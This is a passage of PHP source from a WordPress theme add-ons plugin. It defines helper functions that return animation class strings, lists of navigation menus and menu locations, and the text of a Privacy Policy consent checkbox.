			'slideOutRight'		=> esc_html__('Slide Out Right','trx_addons'),
			'zoomOut'			=> esc_html__('Zoom Out',		'trx_addons'),
			'zoomOutUp'			=> esc_html__('Zoom Out Up',	'trx_addons'),
			'zoomOutDown'		=> esc_html__('Zoom Out Down',	'trx_addons'),
			'zoomOutLeft'		=> esc_html__('Zoom Out Left',	'trx_addons'),
			'zoomOutRight'		=> esc_html__('Zoom Out Right',	'trx_addons')
		));
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return classes list for the specified animation
if (!function_exists('trx_addons_get_animation_classes')) {
	function trx_addons_get_animation_classes($animation, $speed='normal', $loop='none') {
		// speed:	fast=0.5s | normal=1s | slow=2s
		// loop:	none | infinite
		return trx_addons_is_off($animation) ? '' : 'animated '.esc_attr($animation).' '.esc_attr($speed).(!trx_addons_is_off($loop) ? ' '.esc_attr($loop) : '');
	}
}

// Return menus list, prepended inherit
if ( !function_exists( 'trx_addons_get_list_menus' ) ) {
	function trx_addons_get_list_menus($prepend_inherit=false) {
		static $list = false;
		if ($list === false) {
			$list = array();
			$list['none'] = esc_html__("- Not selected -", 'trx_addons');
			$menus = wp_get_nav_menus();
			if (is_array($menus) && count($menus) > 0) {
				foreach ($menus as $menu) {
					$list[$menu->slug] = $menu->name;
				}
			}
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return menu locations list, prepended inherit
if ( !function_exists( 'trx_addons_get_list_menu_locations' ) ) {
	function trx_addons_get_list_menu_locations($prepend_inherit=false) {
		static $list = false;
		if ($list === false) {
			$list = array();
			$list['none'] = esc_html__("- Not selected -", 'trx_addons');
			$menus = get_registered_nav_menus();
			if (is_array($menus)) {
				foreach ( $menus as $location => $description )
					$list[$location] = $description;
			}
			$list = apply_filters('trx_addons_filter_menu_locations', $list);
		}
		return $prepend_inherit ? trx_addons_array_merge(array('inherit' => esc_html__("Inherit", 'trx_addons')), $list) : $list;
	}
}

// Return text for the Privacy Policy checkbox
if (!function_exists('trx_addons_get_privacy_text')) {
	function trx_addons_get_privacy_text() {
		$page = get_option('wp_page_for_privacy_policy');
		return apply_filters( 'trx_addons_filter_privacy_text', wp_kses_post(
				__( 'I agree that my submitted data is being collected and stored.', 'trx_addons' )
				. ( '' != $page
					// Translators: Add url to the Privacy Policy page
					? ' ' . sprintf(__('For further details on handling user data, see our %s', 'trx_addons'),
						'<a href="' . esc_url(get_permalink($page)) . '" target="_blank">'
						. __('Privacy Policy', 'trx_addons')
						. '</a>')
					: ''
				)
			)
		);
	}
}
?>